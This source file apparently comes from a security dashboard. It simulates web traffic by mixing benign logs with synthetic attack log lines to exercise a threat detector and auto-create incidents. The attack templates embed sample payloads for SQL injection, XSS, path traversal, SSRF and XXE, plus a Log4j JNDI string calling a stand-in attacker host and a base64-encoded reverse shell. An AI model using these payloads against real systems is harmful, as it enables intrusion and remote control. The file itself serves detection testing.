const logAnalysisService = require("./logAnalysisService");
const incidentService = require("./incidentService");
const fs = require("fs");
const path = require("path");

let isRunning = false;
let intervalId = null;
let ioInstance = null;
let logsGeneratedCount = 0;
let threatsBlockedCount = 0;
const recentIncidentsByIp = new Map();
let lastIncidentCreationTime = 0;

let realBenignLogs = [];
let cloudTrailLogs = [];
let sqliPayloads = [];
let xssPayloads = [];
let lfiPayloads = [];
let cmdiPayloads = [];
let ssrfPayloads = [];
let nosqliPayloads = [];
let sstiPayloads = [];
let xxePayloads = [];
let ldapPayloads = [];
let deserPayloads = [];
let openredPayloads = [];
let crlfPayloads = [];
let jwtPayloads = [];
let dirbrutePayloads = [];

try {
  const load = (name) => fs.readFileSync(path.join(__dirname, "..", "data", `${name}_payloads.txt`), "utf-8").split('\n').filter(Boolean);
  sqliPayloads = load("sqli");
  xssPayloads = load("xss");
  lfiPayloads = load("lfi");
  cmdiPayloads = load("cmdi");
  ssrfPayloads = load("ssrf");
  nosqliPayloads = load("nosqli");
  sstiPayloads = load("ssti");
  xxePayloads = load("xxe");
  ldapPayloads = load("ldap");
  deserPayloads = load("deserialization");
  openredPayloads = load("open_redirect");
  crlfPayloads = load("crlf");
  jwtPayloads = load("jwt");
  dirbrutePayloads = load("directory_brute");
  console.log(`[Chaos Engine] Loaded thousands of advanced enterprise payloads across 14 categories.`);
} catch (err) {
  console.log(`[Chaos Engine] Dynamic payloads not found. Falling back to static templates.`);
  console.error(err);
  sqliPayloads = ["1' OR '1'='1"]; xssPayloads = ["<script>alert(1)</script>"]; lfiPayloads = ["../../../../etc/passwd"]; cmdiPayloads = ["whoami"]; ssrfPayloads = ["http://169.254.169.254"]; nosqliPayloads = ["{$gt: ''}"]; sstiPayloads = ["{{7*7}}"]; xxePayloads = ["<!ENTITY xxe SYSTEM 'file:///etc/passwd'>"]; ldapPayloads = ["*(objectclass=*)"]; deserPayloads = ["rO0ABXNy"]; openredPayloads = ["//evil.com"]; crlfPayloads = ["%0D%0ASet-Cookie: session=hacked"]; jwtPayloads = ["eyJhbGciOiJub25l"]; dirbrutePayloads = ["/admin"];
}

const ATTACK_TEMPLATES = [
  // SQLi
  () => `198.51.100.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "GET /api/v1/users?${sqliPayloads[Math.floor(Math.random() * sqliPayloads.length)]} HTTP/1.1" 500 1024`,
  () => `198.51.100.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "POST /auth/login HTTP/1.1" 200 450 - payload: {"username": "${sqliPayloads[Math.floor(Math.random() * sqliPayloads.length)].replace(/"/g, '\\"')}", "password": "password"}`,
  
  // Path Traversal / LFI
  () => `45.33.32.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "GET /download?${lfiPayloads[Math.floor(Math.random() * lfiPayloads.length)]} HTTP/1.1" 403 240`,
  
  // XSS
  () => `103.251.167.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "POST /comments/new HTTP/1.1" 201 540 - body: ${xssPayloads[Math.floor(Math.random() * xssPayloads.length)]}`,
  () => `103.251.167.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "GET /search?term=${encodeURIComponent(xssPayloads[Math.floor(Math.random() * xssPayloads.length)])} HTTP/1.1" 200 320`,
  
  // Command Injection (CMDi)
  () => `194.26.29.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "POST /api/ping HTTP/1.1" 200 890 - body: {"host": "127.0.0.1 ${cmdiPayloads[Math.floor(Math.random() * cmdiPayloads.length)]}"}`,
  
  // SSRF
  () => `104.18.22.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "POST /api/webhook HTTP/1.1" 200 300 - body: {"${ssrfPayloads[Math.floor(Math.random() * ssrfPayloads.length)]}"}`,
  
  // NoSQL Injection
  () => `13.33.22.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "POST /api/users/find HTTP/1.1" 200 150 - body: {"${nosqliPayloads[Math.floor(Math.random() * nosqliPayloads.length)]}"}`,
  
  // SSTI
  () => `18.22.44.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "GET /profile?name=${sstiPayloads[Math.floor(Math.random() * sstiPayloads.length)]} HTTP/1.1" 500 244`,
  
  // XXE
  () => `44.55.66.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "POST /api/upload_xml HTTP/1.1" 500 310 - body: ${xxePayloads[Math.floor(Math.random() * xxePayloads.length)]}`,
  
  // LDAP Injection
  () => `55.66.77.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "POST /api/auth/ldap HTTP/1.1" 401 122 - body: {"${ldapPayloads[Math.floor(Math.random() * ldapPayloads.length)]}"}`,
  
  // Insecure Deserialization
  () => `66.77.88.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "POST /api/sync HTTP/1.1" 500 890 - body: {"${deserPayloads[Math.floor(Math.random() * deserPayloads.length)]}"}`,
  
  // Open Redirect
  () => `77.88.99.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "GET /auth/callback?${openredPayloads[Math.floor(Math.random() * openredPayloads.length)]} HTTP/1.1" 302 0`,
  
  // CRLF
  () => `88.99.100.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "GET /api/headers?${crlfPayloads[Math.floor(Math.random() * crlfPayloads.length)]} HTTP/1.1" 200 40`,
  
  // JWT Tampering
  () => `99.100.111.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "GET /api/secure/data HTTP/1.1" 403 120 - header: ${jwtPayloads[Math.floor(Math.random() * jwtPayloads.length)]}`,
  
  // Directory Brute-Forcing
  () => `111.122.133.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "GET ${dirbrutePayloads[Math.floor(Math.random() * dirbrutePayloads.length)]} HTTP/1.1" 404 150`,

  // Log4j
  () => `185.191.171.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "GET /login HTTP/1.1" 400 320 - User-Agent: \${jndi:ldap://log4j.attacker.io:1389/Exploit}`,
  
  // High Entropy Obfuscation
  () => `203.0.113.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "POST /upload HTTP/1.1" 200 4096 - payload: eval(base64_decode('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjAuMC4xIiw0MjQyKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0p'))`,
  
  // Brute Force Burst
  () => `192.0.2.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "POST /api/v2/auth/token HTTP/1.1" 401 120 - Failed password for user root (attempt #${Math.floor(Math.random() * 50) + 1})`
];

const BENIGN_TEMPLATES = [
  () => `172.56.21.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "GET /api/v1/dashboard HTTP/1.1" 200 3420 "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"`,
  () => `172.56.21.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "GET /assets/main.css HTTP/1.1" 304 0 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"`,
  () => `172.56.21.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "GET /api/health HTTP/1.1" 200 42 "HealthCheck-Monitor/1.0"`,
  () => `10.0.0.15 - - [${new Date().toISOString()}] "GET /favicon.ico HTTP/1.1" 200 1150 "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)"`,
  () => `172.56.21.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "POST /api/v1/checkout HTTP/1.1" 200 850 "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"`,
  () => `10.0.0.120 - - [${new Date().toISOString()}] "GET /api/products?category=electronics&page=1 HTTP/1.1" 200 4500 "Chrome/114.0.0.0"`
];

try {
  const dataPath = path.join(__dirname, "..", "data", "access_sampled.log");
  const data = fs.readFileSync(dataPath, "utf-8");
  realBenignLogs = data.split('\n').filter(line => line.trim().length > 0);
  console.log(`[Chaos Engine] Successfully loaded ${realBenignLogs.length} real web logs from access_sampled.log`);
} catch (err) {
  console.log(`[Chaos Engine] Dataset access_sampled.log not found. Falling back to static web templates.`);
}

try {
  const cloudPath = path.join(__dirname, "..", "data", "cloudtrail_sampled.csv");
  const data = fs.readFileSync(cloudPath, "utf-8");
  // Skip header and empty lines
  cloudTrailLogs = data.split('\n').slice(1).filter(line => line.trim().length > 0);
  console.log(`[Chaos Engine] Successfully loaded ${cloudTrailLogs.length} CloudTrail logs from cloudtrail_sampled.csv`);
} catch (err) {
  console.log(`[Chaos Engine] Dataset cloudtrail_sampled.csv not found. No cloud logs will be simulated.`);
}

let splunkLogs = [];
try {
  const splunkPath = path.join(__dirname, "..", "data", "botsv3_sampled.log");
  const data = fs.readFileSync(splunkPath, "utf-8");
  splunkLogs = data.split('\n').filter(line => line.trim().length > 0);
  console.log(`[Chaos Engine] Successfully loaded ${splunkLogs.length} Splunk BOTS v3 logs`);
} catch (err) {
  console.log(`[Chaos Engine] Dataset botsv3_sampled.log not found. Skipping Splunk integration.`);
}

function generateSingleLog(attackRatio = 0.35) {
  const isAttack = Math.random() < attackRatio; 
  let rawLog = "";
  if (isAttack) {
    const template = ATTACK_TEMPLATES[Math.floor(Math.random() * ATTACK_TEMPLATES.length)];
    rawLog = template();
  } else {
    // 50% chance Nginx, 30% chance CloudTrail, 20% chance Splunk BOTS (if available)
    const rng = Math.random();
    if (rng < 0.20 && splunkLogs.length > 0) {
        rawLog = splunkLogs[Math.floor(Math.random() * splunkLogs.length)];
    } else if (rng < 0.50 && cloudTrailLogs.length > 0) {
        rawLog = cloudTrailLogs[Math.floor(Math.random() * cloudTrailLogs.length)];
    } else if (realBenignLogs.length > 0) {
        rawLog = realBenignLogs[Math.floor(Math.random() * realBenignLogs.length)];
    } else {
        const template = BENIGN_TEMPLATES[Math.floor(Math.random() * BENIGN_TEMPLATES.length)];
        rawLog = template();
    }
  }

  logsGeneratedCount++;
  const analysis = logAnalysisService.detectThreat(rawLog);

  if (analysis.status === "threat_detected") {
    threatsBlockedCount++;
  }

  return {
    rawLog,
    analysis,
    timestamp: new Date().toISOString()
  };
}

function startSimulator(io, intervalMs = 1500, attackRatio = 0.35) {
  if (isRunning) return { isRunning: true, message: "Simulator is already running" };
  isRunning = true;
  ioInstance = io;

  intervalId = setInterval(async () => {
    try {
      const sample = generateSingleLog(attackRatio);

      // Emit telemetry stream event to all connected clients
      if (ioInstance) {
        ioInstance.emit("telemetry_stream", {
          raw: sample.rawLog,
          timestamp: sample.timestamp,
          isThreat: sample.analysis.status === "threat_detected",
          threatType: sample.analysis.type,
          threatScore: sample.analysis.threatScore || 0,
          severity: sample.analysis.severity,
          sourceIp: sample.analysis.normalizedLog?.sourceIp,
          geo: sample.analysis.normalizedLog?.geo,
          stats: {
            totalGenerated: logsGeneratedCount,
            threatsBlocked: threatsBlockedCount
          }
        });
      }

      // If threat is HIGH or CRITICAL, apply a deterministic threshold to prevent database alert storms.
      // We allow all correlated events to pass, but strictly rate-limit NEW incident generation to 1 per 2.5 seconds globally.
      if (sample.analysis.status === "threat_detected" && (sample.analysis.severity === "HIGH" || sample.analysis.severity === "CRITICAL")) {
        const sourceIp = sample.analysis.normalizedLog?.sourceIp || "unknown";
        let correlatedId = sourceIp !== "unknown" ? recentIncidentsByIp.get(sourceIp) : null;
        const nowMs = Date.now();

        if (true) {
          if (correlatedId) {
              try {
                await incidentService.addComment(correlatedId, {
                  note: `[CORRELATION] Repeated simulated attack blocked from this IP. Threat: ${sample.analysis.type}. Score: ${sample.analysis.threatScore}`,
                  author: "Chaos-Engine"
                });
                if (ioInstance) ioInstance.emit("incident_updated", { incidentId: correlatedId });
              } catch (e) {
                recentIncidentsByIp.delete(sourceIp);
                correlatedId = null;
              }
            }

          if (!correlatedId) {
            const autoInc = await incidentService.createIncident({
              title: `[Live Threat] ${sample.analysis.type}`,
              severity: sample.analysis.severity,
              status: "OPEN",
              assignedTo: "SOC-Engine",
              description: `Interception of live simulated attack from source ${sourceIp}. Threat Score: ${sample.analysis.threatScore}/100. Payload: ${sample.rawLog.slice(0, 150)}...`,
              playbook: sample.analysis.playbook,
              payload: sample.analysis.forensicPackage,
              confidence: sample.analysis.confidence,
              threatType: sample.analysis.type,
              mitreTechnique: JSON.stringify(sample.analysis.mitre)
            });

            if (sourceIp !== "unknown") {
              recentIncidentsByIp.set(sourceIp, autoInc.incidentId);
              setTimeout(() => recentIncidentsByIp.delete(sourceIp), 15 * 60 * 1000);
            }

            if (ioInstance) {
              ioInstance.emit("incident_created", autoInc);
              ioInstance.emit("dashboard_update_needed");
            }
            lastIncidentCreationTime = nowMs;
          }
        }
      }
    } catch (err) {
      console.error("Error in simulator loop:", err);
    }
  }, intervalMs);

  return { isRunning: true, message: "Chaos Engine Traffic Simulator started" };
}

function stopSimulator() {
  if (!isRunning) return { isRunning: false, message: "Simulator is not running" };
  clearInterval(intervalId);
  isRunning = false;
  intervalId = null;

  if (ioInstance) {
    ioInstance.emit("simulator_state_changed", { isRunning: false });
  }

  return { isRunning: false, message: "Chaos Engine Traffic Simulator stopped" };
}

function getStatus() {
  return {
    isRunning,
    logsGeneratedCount,
    threatsBlockedCount
  };
}

function resetCounters() {
  logsGeneratedCount = 0;
  threatsBlockedCount = 0;
  recentIncidentsByIp.clear();
}

module.exports = {
  startSimulator,
  stopSimulator,
  getStatus,
  generateSingleLog,
  resetCounters
};
